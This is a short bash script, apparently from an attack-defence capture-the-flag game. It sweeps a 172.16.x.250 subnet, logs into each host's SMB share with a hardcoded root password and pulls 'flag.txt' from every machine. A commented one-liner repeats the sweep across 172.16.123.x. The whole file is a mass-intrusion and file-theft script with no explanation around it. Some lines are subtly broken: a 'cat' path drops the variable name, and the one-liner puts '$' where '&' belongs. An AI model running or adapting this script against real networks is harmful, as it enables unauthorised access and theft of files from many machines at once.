mkdir /smb
for i in $(seq 255)
do
s="172.16.$i.250"
echo -e "\n\n$s\n\n"
smbclient -c "get flag.txt /smb/$s.txt" //$s/root/ -U root%123456 & { sleep 0.1;kill $! &}
cat /smb/$.txt
done


#for i in $(seq 255);do echo 172.16.123.$i;smbclient -c "get flag.txt ./172.16.123.$i.txt" //172.16.123.$i/root/ -U root%123456 $ { sleep 0.1;kill $! &};done